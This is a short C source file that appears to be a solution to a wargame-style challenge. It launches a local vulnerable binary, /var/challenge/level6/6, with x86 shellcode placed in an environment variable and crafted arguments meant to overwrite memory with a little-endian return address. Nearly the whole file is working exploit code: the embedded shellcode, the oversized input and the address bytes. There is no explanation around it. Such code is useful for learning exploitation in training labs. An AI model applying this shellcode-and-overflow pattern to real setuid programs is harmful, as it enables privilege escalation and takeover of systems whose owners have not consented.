
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    // Shellcode that executes "/usr/local/bin/l33t"
    char *shellcode = "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14"
                      "\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/l33t"; 
    
    // Environment variable containing the shellcode
    char *env[] = {(shellcode), NULL};  

    // Arguments to exploit the program with the memory address 0xbffffbf in little endian
    char *arg1 = "\xb0 28";  
    char *arg2 = "\xff 29";  
    char *arg3 = "\xff 30";  
    char *arg4 = "\xbf 31";  

  
    char *args[] = {
        "/var/challenge/level6/6",  // Path to the vulnerable binary
        "65535",  // input to overflow
        arg1,  
        arg2,  
        arg3,  
        arg4,  
        NULL
    };

    // Execute /var/challenge/level6/6 with crafted args and env
    execve("/var/challenge/level6/6", args, env);
}

